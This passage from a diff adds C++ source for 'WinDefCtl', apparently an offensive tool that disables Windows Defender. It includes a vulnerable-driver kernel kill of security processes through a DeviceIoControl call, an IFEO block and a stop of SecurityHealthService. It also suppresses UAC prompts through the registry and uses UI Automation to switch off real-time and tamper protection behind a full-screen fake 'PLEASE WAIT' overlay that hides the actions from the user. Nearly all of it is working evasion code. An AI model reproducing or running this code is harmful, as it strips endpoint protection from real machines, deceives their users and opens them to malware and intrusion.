+                                std::vector<BYTE> buf(1036, 0);
+                                *reinterpret_cast<DWORD*>(buf.data()) = pe.th32ProcessID;
+                                DWORD ret = 0;
+                                if (DeviceIoControl(hDev, 0x22201C,
+                                                    buf.data(), static_cast<DWORD>(buf.size()),
+                                                    nullptr, 0, &ret, nullptr))
+                                    std::wcout << L"[+] " << target << L" (PID "
+                                               << pe.th32ProcessID << L") terminated\n";
+                                else
+                                    std::wcout << L"[-] IOCTL failed for " << target
+                                               << L" (err=" << GetLastError() << L")\n";
+                            }
+                        }
+                    } while (Process32NextW(hSnap, &pe));
+                }
+                CloseHandle(hSnap);
+            }
+            CloseHandle(hDev);
+        } else {
+            std::wcout << L"[-] Cannot open Warsaw_PM (err=" << GetLastError() << L")\n";
+        }
+
+        // SCM-stop SecurityHealthService
+        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService",
+                                         SERVICE_STOP | SERVICE_QUERY_STATUS);
+        if (hHealth) {
+            SERVICE_STATUS ss{};
+            ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
+            CloseServiceHandle(hHealth);
+        }
+
+        // Stop wsftprm; delete only if we created it (not KVC's service)
+        if (ownService)
+            StopAndDelete(hSvc);
+        else {
+            SERVICE_STATUS ss{};
+            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
+        }
+    }
+
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+
+    return killerLoaded;
+}
+
+```
+
+`src/KillerEngine.h`:
+
+```h
+#pragma once
+
+namespace KillerEngine {
+    bool KillDefender(const wchar_t* killerSysPath) noexcept;
+}
+
+```
+
+`src/Main.cpp`:
+
+```cpp
+#include "WinDefCtl.h"
+#include "BannerUtils.h"
+#include "DefenderManager.h"
+#include "KillerEngine.h"
+#include "DriverExtract.h"
+#include <iostream>
+
+int wmain(int argc, wchar_t* argv[]) {
+    if (argc < 2) {
+        BannerUtils::ShowUsage();
+        return 0;
+    }
+
+    std::wstring command = argv[1];
+
+    // ── kill ─────────────────────────────────────────────────────────────────
+    // IFEO block + kvckiller.sys kernel-kill. No UI overlay (silent).
+    if (command == L"kill") {
+        BannerUtils::ShowBanner();
+        std::wcout << L"\n=== Windows Defender Kill ===\n\n";
+
+        std::wcout << L"[*] Extracting kvckiller.sys...\n";
+        if (!ExtractKillerDriver()) {
+            std::wcout << L"[!] Driver extraction failed\n";
+            return 1;
+        }
+
+        if (!DefenderManager::DisableSecurityEngine())
+            return 1;
+
+        if (!KillerEngine::KillDefender(GetKillerDriverPath()))
+            std::wcout << L"[-] Kernel kill incomplete\n";
+
+        std::wcout << L"\n[*] Done. Defender is blocked.\n";
+        return 0;
+    }
+
+    // ── restore ───────────────────────────────────────────────────────────────
+    // Remove IFEO block + start WinDefend. No UI overlay (silent).
+    if (command == L"restore") {
+        BannerUtils::ShowBanner();
+        std::wcout << L"\n=== Windows Defender Restore ===\n\n";
+
+        if (!DefenderManager::EnableSecurityEngine())
+            return 1;
+
+        std::wcout << L"\n[*] Done. Defender is restored.\n";
+        return 0;
+    }
+
+    // ── rtp ───────────────────────────────────────────────────────────────────
+    if (command == L"rtp") {
+        BannerUtils::ShowBanner();
+        std::wcout << L"\n=== Windows Defender RTP Control ===\n";
+
+        WindowsDefenderAutomation wda;
+
+        if (!wda.openDefenderSettings()) {
+            std::wcout << L"  [ERROR] Fatal: Cannot open Windows Security.\n";
+            return 1;
+        }
+
+        if (argc < 3) {
+            wda.getRealTimeProtectionStatus();
+            wda.closeSecurityWindow();
+            return 0;
+        }
+
+        std::wstring action = argv[2];
+        bool result = false;
+
+        if (action == L"on")           result = wda.enableRealTimeProtection();
+        else if (action == L"off")     result = wda.disableRealTimeProtection();
+        else if (action == L"status")  wda.getRealTimeProtectionStatus();
+        else {
+            std::wcout << L"  [ERROR] Unknown action: " << action << L"\n";
+            BannerUtils::ShowUsage();
+        }
+
+        wda.closeSecurityWindow();
+        return result ? 0 : 1;
+    }
+
+    // ── tp ────────────────────────────────────────────────────────────────────
+    if (command == L"tp") {
+        BannerUtils::ShowBanner();
+        std::wcout << L"\n=== Windows Defender Tamper Protection Control ===\n";
+
+        WindowsDefenderAutomation wda;
+
+        if (!wda.openDefenderSettings()) {
+            std::wcout << L"  [ERROR] Fatal: Cannot open Windows Security.\n";
+            return 1;
+        }
+
+        if (argc < 3) {
+            wda.getTamperProtectionStatus();
+            wda.closeSecurityWindow();
+            return 0;
+        }
+
+        std::wstring action = argv[2];
+        bool result = false;
+
+        if (action == L"on")           result = wda.enableTamperProtection();
+        else if (action == L"off")     result = wda.disableTamperProtection();
+        else if (action == L"status")  wda.getTamperProtectionStatus();
+        else {
+            std::wcout << L"  [ERROR] Unknown action: " << action << L"\n";
+            BannerUtils::ShowUsage();
+        }
+
+        wda.closeSecurityWindow();
+        return result ? 0 : 1;
+    }
+
+    BannerUtils::ShowUsage();
+    return 0;
+}
+
+```
+
+`src/OverlayWindow.cpp`:
+
+```cpp
+#include "OverlayWindow.h"
+
+#include <windows.h>
+#include <d2d1.h>
+#include <dwrite.h>
+#include <cmath>
+#include <cstdio>
+
+// ============================================================================
+// D2D / DWrite state — all accessed on the overlay thread only
+// ============================================================================
+
+static ID2D1Factory*          g_d2dFactory = nullptr;
+static IDWriteFactory*        g_dwFactory  = nullptr;
+static IDWriteTextFormat*     g_textFmt    = nullptr;
+static ID2D1HwndRenderTarget* g_rt         = nullptr;
+static ID2D1SolidColorBrush*  g_textBrush  = nullptr;
+static ID2D1SolidColorBrush*  g_scanBrush  = nullptr;
+
+static volatile HWND g_hwnd   = nullptr;
+static HANDLE        g_thread = nullptr;
+static HANDLE        g_ready  = nullptr;
+static int           g_tick   = 0;
+
+// ============================================================================
+
+template <class T>
+static inline void SafeRelease(T** pp) noexcept
+{ if (*pp) { (*pp)->Release(); *pp = nullptr; } }
+
+static HRESULT CreateDeviceResources(HWND hwnd) noexcept
+{
+    if (g_rt) return S_OK;
+
+    RECT rc{};
+    GetClientRect(hwnd, &rc);
+
+    HRESULT hr = g_d2dFactory->CreateHwndRenderTarget(
+        D2D1::RenderTargetProperties(),
+        D2D1::HwndRenderTargetProperties(hwnd, D2D1::SizeU(rc.right, rc.bottom)),
+        &g_rt);
+    if (FAILED(hr)) return hr;
+
+    hr = g_rt->CreateSolidColorBrush(D2D1::ColorF(0.f, 1.f, 0.25f), &g_textBrush);
+    if (FAILED(hr)) return hr;
+
+    // Semi-transparent black scanlines drawn over everything
+    return g_rt->CreateSolidColorBrush(D2D1::ColorF(0.f, 0.f, 0.f, 0.45f), &g_scanBrush);
+}
+
+static void DiscardDeviceResources() noexcept
+{
+    SafeRelease(&g_scanBrush);
+    SafeRelease(&g_textBrush);
+    SafeRelease(&g_rt);
+}
+
+// ============================================================================
+// Render one frame — called from WM_PAINT on the overlay thread
+// ============================================================================
+
+static void RenderFrame(HWND hwnd) noexcept
+{
+    if (!g_rt && FAILED(CreateDeviceResources(hwnd))) return;
+
+    // Animated dots: 0..3, step every 4 ticks × 150 ms = 600 ms per step
+    static const wchar_t* kDots[] = { L"", L".", L"..", L"..." };
+    const int dotIdx = (g_tick / 4) % 4;
+
+    // Green pulse: full sine cycle every 40 ticks × 150 ms ≈ 6 s
+    const float phase  = static_cast<float>(g_tick % 40) / 40.f;
+    const float bright = 0.50f + 0.50f * sinf(phase * 6.28318f);
+
+    const D2D1_SIZE_F sz = g_rt->GetSize();
+
+    g_rt->BeginDraw();
+    g_rt->Clear(D2D1::ColorF(0.f, 0.f, 0.f));
+
+    g_textBrush->SetColor(D2D1::ColorF(0.f, bright * 0.90f, bright * 0.20f));
+
+    wchar_t buf[32];
+    swprintf_s(buf, L"PLEASE WAIT%s", kDots[dotIdx]);
+
+    g_rt->DrawText(buf, static_cast<UINT32>(wcslen(buf)), g_textFmt,
+                   D2D1::RectF(0.f, 0.f, sz.width, sz.height), g_textBrush);
+
+    // CRT scanlines: 1.5px dark horizontal line every 3 pixels
+    for (float y = 0.f; y < sz.height; y += 3.f)
+        g_rt->DrawLine(D2D1::Point2F(0.f, y), D2D1::Point2F(sz.width, y),
+                       g_scanBrush, 1.5f);
+
+    if (g_rt->EndDraw() == D2DERR_RECREATE_TARGET)
+        DiscardDeviceResources();
+}
+
+// ============================================================================
+// Window procedure
+// ============================================================================
+
+static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
+{
+    switch (msg) {
+    case WM_TIMER:
+        ++g_tick;
+        InvalidateRect(hwnd, nullptr, FALSE);
+        return 0;
+
+    case WM_PAINT: {
+        PAINTSTRUCT ps;
+        BeginPaint(hwnd, &ps);
+        RenderFrame(hwnd);
+        EndPaint(hwnd, &ps);
+        return 0;
+    }
+
+    case WM_SIZE:
+        if (g_rt && LOWORD(lp) > 0 && HIWORD(lp) > 0)
+            g_rt->Resize(D2D1::SizeU(LOWORD(lp), HIWORD(lp)));
+        InvalidateRect(hwnd, nullptr, FALSE);
+        return 0;
+
+    case WM_CLOSE:
+    case WM_DESTROY:
+        KillTimer(hwnd, 1);
+        PostQuitMessage(0);
+        return 0;
+
+    default:
+        return DefWindowProcW(hwnd, msg, wp, lp);
+    }
+}
+
+// ============================================================================
+// Overlay thread — owns all D2D objects and the message loop
+// ============================================================================
+
+static DWORD WINAPI OverlayThread(LPVOID) noexcept
+{
+    if (FAILED(D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &g_d2dFactory)) ||
+        FAILED(DWriteCreateFactory(DWRITE_FACTORY_TYPE_SHARED,
+                                   __uuidof(IDWriteFactory),
+                                   reinterpret_cast<IUnknown**>(&g_dwFactory))) ||
+        FAILED(g_dwFactory->CreateTextFormat(
+                   L"Consolas", nullptr,
+                   DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL,
+                   DWRITE_FONT_STRETCH_NORMAL, 80.f, L"en-us", &g_textFmt)))
+    {
+        SetEvent(g_ready);
+        return 1;
+    }
+
+    g_textFmt->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
+    g_textFmt->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
+
+    HINSTANCE hInst = GetModuleHandleW(nullptr);
+
+    WNDCLASSEXW wc{ sizeof(wc) };
+    wc.style         = CS_HREDRAW | CS_VREDRAW;
+    wc.lpfnWndProc   = WndProc;
+    wc.hInstance     = hInst;
+    wc.hbrBackground = static_cast<HBRUSH>(GetStockObject(BLACK_BRUSH));
+    wc.lpszClassName = L"WDCOverlay";
+    RegisterClassExW(&wc);
+
+    const int sw = GetSystemMetrics(SM_CXSCREEN);
+    const int sh = GetSystemMetrics(SM_CYSCREEN);
+
+    HWND hwnd = CreateWindowExW(
+        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
+        L"WDCOverlay", nullptr, WS_POPUP,
+        0, 0, sw, sh, nullptr, nullptr, hInst, nullptr);
+
+    if (!hwnd) { SetEvent(g_ready); return 1; }
+
+    ShowWindow(hwnd, SW_SHOWNOACTIVATE);
+    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                 SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+    SetTimer(hwnd, 1, 150, nullptr);
+
+    g_hwnd = hwnd;
+    SetEvent(g_ready);
+
+    MSG msg;
+    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+
+    DiscardDeviceResources();
+    SafeRelease(&g_textFmt);
+    SafeRelease(&g_dwFactory);
+    SafeRelease(&g_d2dFactory);
+
+    g_hwnd = nullptr;
+    UnregisterClassW(L"WDCOverlay", hInst);
+    return 0;
+}
+
+// ============================================================================
+// Public API
+// ============================================================================
+
+bool OverlayWindow::Show() noexcept
+{
+    if (g_hwnd) return true;
+
+    g_tick  = 0;
+    g_ready = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+    if (!g_ready) return false;
+
+    g_thread = CreateThread(nullptr, 0, OverlayThread, nullptr, 0, nullptr);
+    if (!g_thread) { CloseHandle(g_ready); g_ready = nullptr; return false; }
+
+    WaitForSingleObject(g_ready, 2000);
+    CloseHandle(g_ready);
+    g_ready = nullptr;
+    return g_hwnd != nullptr;
+}
+
+void OverlayWindow::Hide() noexcept
+{
+    const HWND hwnd = g_hwnd;
+    if (hwnd) PostMessageW(hwnd, WM_CLOSE, 0, 0);
+
+    if (g_thread) {
+        WaitForSingleObject(g_thread, 3000);
+        CloseHandle(g_thread);
+        g_thread = nullptr;
+    }
+}
+
+```
+
+`src/OverlayWindow.h`:
+
+```h
+#pragma once
+
+namespace OverlayWindow {
+    bool Show() noexcept;
+    void Hide() noexcept;
+}
+
+```
+
+`src/Resource.h`:
+
+```h
+//{{NO_DEPENDENCIES}}
+// Microsoft Visual C++ generated include file.
+// Used by WinDefCtl.rc
+
+#define IDI_ICON1                       101
+#define IDR_DRIVER                      102
+
+// Next default values for new objects
+//
+#ifdef APSTUDIO_INVOKED
+#ifndef APSTUDIO_READONLY_SYMBOLS
+#define _APS_NEXT_RESOURCE_VALUE        103
+#define _APS_NEXT_COMMAND_VALUE         40001
+#define _APS_NEXT_CONTROL_VALUE         1001
+#define _APS_NEXT_SYMED_VALUE           101
+#endif
+#endif
+
+```
+
+`src/StealthUtils.cpp`:
+
+```cpp
+#include "StealthUtils.h"
+#include <iostream>
+
+// ============================================================================
+// Registry Helpers
+// ============================================================================
+
+bool StealthUtils::ReadRegistryDword(const wchar_t* valueName, DWORD& outValue, bool& existed) {
+    HKEY hKey;
+    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_READ, &hKey);
+    if (result != ERROR_SUCCESS) { existed = false; return false; }
+
+    DWORD type = REG_DWORD;
+    DWORD size = sizeof(DWORD);
+    result = RegQueryValueExW(hKey, valueName, nullptr, &type, (LPBYTE)&outValue, &size);
+    RegCloseKey(hKey);
+
+    existed = (result == ERROR_SUCCESS && type == REG_DWORD);
+    return existed;
+}
+
+bool StealthUtils::WriteRegistryDword(const wchar_t* valueName, DWORD value) {
+    HKEY hKey;
+    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_WRITE, &hKey);
+    if (result != ERROR_SUCCESS) return false;
+
+    result = RegSetValueExW(hKey, valueName, 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
+bool StealthUtils::DeleteRegistryValue(const wchar_t* valueName) {
+    HKEY hKey;
+    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_WRITE, &hKey);
+    if (result != ERROR_SUCCESS) return false;
+
+    result = RegDeleteValueW(hKey, valueName);
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
+// ============================================================================
+// UAC Logic
+// ============================================================================
+
+DWORD StealthUtils::EncodeUACStatus(DWORD cpba, bool cpbaExisted, DWORD posd, bool posdExisted) {
+    DWORD encoded = 0;
+    encoded |= (cpbaExisted ? (cpba & 0xFF) : KEY_NOT_EXISTED);
+    encoded |= ((posdExisted ? (posd & 0xFF) : KEY_NOT_EXISTED) << 8);
+    return encoded;
+}
+
+void StealthUtils::DecodeUACStatus(DWORD encoded, DWORD& cpba, bool& cpbaExisted,
+                                   DWORD& posd, bool& posdExisted) {
+    BYTE cpbaByte = encoded & 0xFF;
+    BYTE posdByte = (encoded >> 8) & 0xFF;
+
+    cpbaExisted = (cpbaByte != KEY_NOT_EXISTED);
+    cpba = cpbaExisted ? cpbaByte : 0;
+
+    posdExisted = (posdByte != KEY_NOT_EXISTED);
+    posd = posdExisted ? posdByte : 0;
+}
+
+bool StealthUtils::BackupAndDisableUAC() {
+    DWORD cpba = 0, posd = 0;
+    bool cpbaExisted = false, posdExisted = false;
+
+    ReadRegistryDword(L"ConsentPromptBehaviorAdmin", cpba, cpbaExisted);
+    ReadRegistryDword(L"PromptOnSecureDesktop", posd, posdExisted);
+
+    DWORD encoded = EncodeUACStatus(cpba, cpbaExisted, posd, posdExisted);
+    if (!WriteRegistryDword(UAC_BACKUP_KEY, encoded)) return false;
+
+    bool success = true;
+    success &= WriteRegistryDword(L"ConsentPromptBehaviorAdmin", 0);
+    success &= WriteRegistryDword(L"PromptOnSecureDesktop", 0);
+    return success;
+}
+
+bool StealthUtils::RestoreUAC() {
+    DWORD encoded = 0;
+    bool backupExisted = false;
+    if (!ReadRegistryDword(UAC_BACKUP_KEY, encoded, backupExisted) || !backupExisted)
+        return false;
+
+    DWORD cpba = 0, posd = 0;
+    bool cpbaExisted = false, posdExisted = false;
+    DecodeUACStatus(encoded, cpba, cpbaExisted, posd, posdExisted);
+
+    if (cpbaExisted) WriteRegistryDword(L"ConsentPromptBehaviorAdmin", cpba);
+    else             DeleteRegistryValue(L"ConsentPromptBehaviorAdmin");
+
+    if (posdExisted) WriteRegistryDword(L"PromptOnSecureDesktop", posd);
+    else             DeleteRegistryValue(L"PromptOnSecureDesktop");
+
+    DeleteRegistryValue(UAC_BACKUP_KEY);
+    return true;
+}
+
+bool StealthUtils::RecoverUACIfNeeded() {
+    DWORD encoded = 0;
+    bool backupExisted = false;
+    if (ReadRegistryDword(UAC_BACKUP_KEY, encoded, backupExisted) && backupExisted) {
+        std::wcout << L"  [RECOVERY] Found incomplete UAC backup, restoring...\n";
+        return RestoreUAC();
+    }
+    return true;
+}
+
+// ============================================================================
+// Volatile Registry Marker (Session Persistence)
+// ============================================================================
+
+bool StealthUtils::CheckVolatileWarmMarker() {
+    HKEY hKey;
+    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\WinDefCtl", 0, KEY_READ, &hKey);
+    if (result != ERROR_SUCCESS) return false;
+
+    DWORD value;
+    DWORD size = sizeof(DWORD);
+    result = RegQueryValueExW(hKey, L"WinDefCtl_Warmed", nullptr, nullptr, (LPBYTE)&value, &size);
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
+bool StealthUtils::SetVolatileWarmMarker() {
+    HKEY hKey;
+    DWORD disposition;
+    LONG result = RegCreateKeyExW(
+        HKEY_CURRENT_USER, L"Software\\WinDefCtl",
+        0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, &disposition
+    );
+    if (result != ERROR_SUCCESS) return false;
+
+    DWORD marker = 1;
+    result = RegSetValueExW(hKey, L"WinDefCtl_Warmed", 0, REG_DWORD,
+                            (LPBYTE)&marker, sizeof(DWORD));
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
+```
+
+`src/StealthUtils.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+
+#define UAC_REGISTRY_PATH L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+#define UAC_BACKUP_KEY L"UACStatus"
+#define KEY_NOT_EXISTED 0xFF
+
+namespace StealthUtils {
+    // UAC management
+    bool BackupAndDisableUAC();
+    bool RestoreUAC();
+    bool RecoverUACIfNeeded();
+
+    // Registry helpers
+    bool ReadRegistryDword(const wchar_t* valueName, DWORD& outValue, bool& existed);
+    bool WriteRegistryDword(const wchar_t* valueName, DWORD value);
+    bool DeleteRegistryValue(const wchar_t* valueName);
+
+    // UAC encoding/decoding
+    DWORD EncodeUACStatus(DWORD cpba, bool cpbaExisted, DWORD posd, bool posdExisted);
+    void  DecodeUACStatus(DWORD encoded, DWORD& cpba, bool& cpbaExisted,
+                          DWORD& posd, bool& posdExisted);
+
+    // Session warm marker (volatile registry)
+    bool CheckVolatileWarmMarker();
+    bool SetVolatileWarmMarker();
+}
+
+```
+
+`src/WinDefCtl.cpp`:
+
+```cpp
+#include "WinDefCtl.h"
+#include "StealthUtils.h"
+#include "BannerUtils.h"
+#include "OverlayWindow.h"
+#include <iostream>
+#include <thread>
+#include <chrono>
+
+using namespace std::chrono_literals;
+
+#if DEBUG_LOGGING_ENABLED
+    #define LOG(msg) std::wcout << msg
+#else
+    #define LOG(msg) ((void)0)
+#endif
+
+// ============================================================================
+// Constructor / Destructor
+// ============================================================================
+
+WindowsDefenderAutomation::WindowsDefenderAutomation() {
+    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+    CoCreateInstance(CLSID_CUIAutomation, nullptr, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pAutomation);
+    
+    // Check if we need to recover UAC from a previous crash
+    StealthUtils::RecoverUACIfNeeded(); 
+}
+
+WindowsDefenderAutomation::~WindowsDefenderAutomation() {
+    if (pRootElement) pRootElement->Release();
+    if (pAutomation) pAutomation->Release();
+    CoUninitialize();
+}
+
+// ============================================================================
+// Window Finder - Simple EnumWindows approach
+// ============================================================================
+
+struct FindWindowData {
+    HWND hWndFound;
+};
+
+BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
+    FindWindowData* data = (FindWindowData*)lParam;
+    wchar_t className[256] = { 0 };
+
+    if (GetClassNameW(hwnd, className, 256)) {
+        if (wcscmp(className, L"ApplicationFrameWindow") == 0 && IsWindowVisible(hwnd)) {
+            data->hWndFound = hwnd;
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+HWND WindowsDefenderAutomation::findSecurityWindow(int maxRetries) {
+    FindWindowData data = { 0 };
+
+    for (int i = 0; i < maxRetries; ++i) {
+        EnumWindows(EnumWindowsCallback, (LPARAM)&data);
+        if (data.hWndFound) {
+            return data.hWndFound;
+        }
+        std::this_thread::sleep_for(100ms);
+    }
+    return NULL;
+}
+
+// ============================================================================
+// Cold Boot Detection and Pre-Warming
+// ============================================================================
+
+bool WindowsDefenderAutomation::isColdBoot() {
+    return !StealthUtils::CheckVolatileWarmMarker();
+}
+
+bool WindowsDefenderAutomation::preWarmDefender() {
+    LOG(L"  [*] Cold boot detected - pre-warming Windows Defender...\n");
+    
+    // Console shield is already active from openDefenderSettings
+    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", 
+                  nullptr, nullptr, SW_SHOWMINNOACTIVE);
+    
+    std::this_thread::sleep_for(800ms);
+    
+    HWND hwnd = findSecurityWindow(10);
+    
+    if (hwnd) {
+        LOG(L"  [*] Pre-warm window found, waiting for full initialization...\n");
+        std::this_thread::sleep_for(800ms);
+        
+        SetForegroundWindow(hwnd);
+        std::this_thread::sleep_for(100ms);
+        
+        LOG(L"  [*] Closing pre-warm window...\n");
+        SendMessage(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
+        
+        // Wait for window to close
+        bool closed = false;
+        for (int i = 0; i < 30; i++) {
+            if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
+                closed = true;
+                break;
+            }
+            std::this_thread::sleep_for(100ms);
+        }
+        
+        if (!closed) {
+            LOG(L"  [*] Retry close with PostMessage...\n");
+            PostMessage(hwnd, WM_CLOSE, 0, 0);
+            std::this_thread::sleep_for(1000ms);
+        }
+        
+        StealthUtils::SetVolatileWarmMarker();
+        LOG(L"  [*] Pre-warm complete\n");
+        return true;
+    }
+    
+    LOG(L"  [WARN] Pre-warm window not found, continuing anyway...\n");
+    return false;
+}
+
+// ============================================================================
+// Open Defender Settings
+// ============================================================================
+
+bool WindowsDefenderAutomation::openDefenderSettings() {
+    LOG(L"\n  [*] Opening Windows Defender...\n");
+    
+    // Show overlay window FIRST - before anything else can flash on screen
+    OverlayWindow::Show();
+
+    if (isColdBoot()) {
+        // Pre-warming now happens safely behind the console shield
+        preWarmDefender();
+        std::this_thread::sleep_for(800ms);
+        
+        // Re-raise overlay in case OS changed Z-order during pre-warm window close
+        OverlayWindow::Show();
+    }
+    
+    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", nullptr, nullptr, SW_SHOWMINNOACTIVE);
+    
+    hwndSecurity = findSecurityWindow(10);
+
+    if (!hwndSecurity || !waitForUILoaded(50)) { 
+        std::wcout << L"  [ERROR] Failed to load UI (Timeout on slow system).\n";
+        OverlayWindow::Hide();
+        return false;
+    }
+    return true;
+}
+
+bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
+    for (int i = 0; i < maxRetries; ++i) {
+        try {
+            if (pRootElement) pRootElement->Release();
+            HRESULT hr = pAutomation->ElementFromHandle(hwndSecurity, &pRootElement);
+            
+            if (SUCCEEDED(hr)) {
+                if (countTotalElements() > 10) return true;
+            }
+        }
+        catch (...) {}
+        std::this_thread::sleep_for(100ms);
+    }
+    return false;
+}
+
+// ============================================================================
+// UI Automation Helpers
+// ============================================================================
+
+IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
+    IUIAutomationCondition* pCondition = nullptr;
+    VARIANT var;
+    var.vt = VT_I4;
+    var.lVal = UIA_ButtonControlTypeId;
+    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);
+
+    IUIAutomationElementArray* pButtons = nullptr;
+    if (!pRootElement) return nullptr;
+    
+    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
+    pCondition->Release();
+
+    if (FAILED(hr) || !pButtons) return nullptr;
+
+    int count = 0;
+    pButtons->get_Length(&count);
+
+    for (int i = 0; i < count; ++i) {
+        IUIAutomationElement* pButton = nullptr;
+        pButtons->GetElement(i, &pButton);
+        
+        IUIAutomationTogglePattern* pToggle = nullptr;
+        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+        if (SUCCEEDED(hr) && pToggle != nullptr) {
+            pToggle->Release();
+            pButtons->Release();
+            return pButton;
+        }
+        pButton->Release();
+    }
+    pButtons->Release();
+    return nullptr;
+}
+
+IUIAutomationElement* WindowsDefenderAutomation::findLastToggleSwitch() {
+    IUIAutomationCondition* pCondition = nullptr;
+    VARIANT var;
+    var.vt = VT_I4;
+    var.lVal = UIA_ButtonControlTypeId;
+    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);
+
+    IUIAutomationElementArray* pButtons = nullptr;
+    if (!pRootElement) return nullptr;
+
+    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
+    pCondition->Release();
+
+    if (FAILED(hr) || !pButtons) return nullptr;
+
+    int count = 0;
+    pButtons->get_Length(&count);
+    IUIAutomationElement* pLastToggle = nullptr;
+
+    for (int i = 0; i < count; ++i) {
+        IUIAutomationElement* pButton = nullptr;
+        pButtons->GetElement(i, &pButton);
+        
+        IUIAutomationTogglePattern* pToggle = nullptr;
+        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+        if (SUCCEEDED(hr) && pToggle != nullptr) {
+            pToggle->Release();
+            if (pLastToggle) pLastToggle->Release();
+            pLastToggle = pButton;
+        } else {
+            pButton->Release();
+        }
+    }
+    pButtons->Release();
+    return pLastToggle;
+}
+
+int WindowsDefenderAutomation::countTotalElements() {
+    if (!pRootElement) return 0;
+    IUIAutomationCondition* pCondition = nullptr;
+    pAutomation->CreateTrueCondition(&pCondition);
+    
+    IUIAutomationElementArray* pElements = nullptr;
+    pRootElement->FindAll(TreeScope_Descendants, pCondition, &pElements);
+    pCondition->Release();
+
+    int count = 0;
+    if (pElements) {
+        pElements->get_Length(&count);
+        pElements->Release();
+    }
+    return count;
+}
+
+bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds) {
+    LOG(L"  [*] Waiting for UI update...");
+    int maxLoops = timeoutSeconds * 10;
+    
+    for (int i = 0; i < maxLoops; ++i) {
+        int currentCount = countTotalElements();
+        bool structureChanged = expectIncrease ? (currentCount > baselineCount) : (currentCount < baselineCount);
+
+        if (structureChanged) {
+            std::this_thread::sleep_for(200ms);
+            int recheckCount = countTotalElements();
+            bool stable = expectIncrease ? (recheckCount > baselineCount) : (recheckCount < baselineCount);
+            
+            if (stable) {
+                LOG(L" [OK]\n");
+                return true;
+            }
+        }
+        std::this_thread::sleep_for(100ms);
+    }
+    LOG(L" [WARN] Timeout.\n");
+    return false;
+}
+
+void WindowsDefenderAutomation::closeSecurityWindow() {
+    if (hwndSecurity) SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
+    OverlayWindow::Hide();
+    std::wcout << L"\n  [*] Operation finished.\n";
+}
+
+// ============================================================================
+// Real-Time Protection Operations
+// ============================================================================
+
+bool WindowsDefenderAutomation::toggleRealTimeProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findFirstToggleSwitch();
+    if (!pButton) { StealthUtils::RestoreUAC(); return false; }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = false;
+    if (pToggle) {
+        ToggleState stateBefore;
+        pToggle->get_CurrentToggleState(&stateBefore);
+        int baseline = countTotalElements();
+
+        pToggle->Toggle();
+        pToggle->Release();
+        pButton->Release();
+
+        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
+    } else {
+        pButton->Release();
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::enableRealTimeProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findFirstToggleSwitch();
+    if (!pButton) { 
+        StealthUtils::RestoreUAC(); 
+        return false; 
+    }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = true;
+    if (pToggle) {
+        ToggleState state;
